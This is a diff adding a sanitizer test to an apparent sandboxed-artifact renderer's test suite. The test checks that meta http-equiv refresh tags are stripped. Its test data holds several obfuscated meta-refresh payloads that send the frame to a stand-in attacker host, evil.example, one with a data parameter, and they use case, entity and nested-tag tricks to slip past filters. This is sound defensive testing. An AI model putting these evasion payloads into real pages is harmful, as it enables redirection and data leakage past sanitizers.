@@ -44,6 +44,23 @@ describe('the sandboxed document', () => {
     expect(artifactCsp(true)).toContain('connect-src https:');
     expect(buildSrcDoc('svg', '<svg/>')).toContain('<body><svg/></body>');
   });
+  it('strips every meta http-equiv from the artifact, so a refresh cannot navigate the frame', () => {
+    const tricks = [
+      '<meta http-equiv="refresh" content="0;url=https://evil.example/?d=1">',
+      '<META HTTP-EQUIV=refresh CONTENT=0;url=https://evil.example/>',
+      '<meta content="0;url=https://evil.example/>" http-equiv="refresh">',
+      "<meta/http-equiv='&#114;efresh' content='0;url=https://evil.example/'>",
+      '<me<meta http-equiv=x>ta http-equiv=refresh content=0;url=https://evil.example/>',
+    ];
+    for (const t of tricks) {
+      const doc = buildSrcDoc('html', `<p>hi</p>${t}`);
+      // Only our own CSP meta is left
+      expect(doc.match(/http-equiv/gi), t).toHaveLength(1);
+      expect(doc).not.toContain('evil.example/"');
+    }
+    expect(buildSrcDoc('html', '<meta name="viewport" content="x"><metadata>')).toContain('<meta name="viewport" content="x"><metadata>');
+    expect(buildSrcDoc('svg', '<svg><meta http-equiv="refresh" content="0;url=https://evil.example/"/></svg>')).toContain('<svg></svg>');
+  });
   it('lets only HTML run scripts, never with same-origin', () => {
     expect(sandboxFor('html')).toBe('allow-scripts');
     expect(sandboxFor('svg')).toBe('');
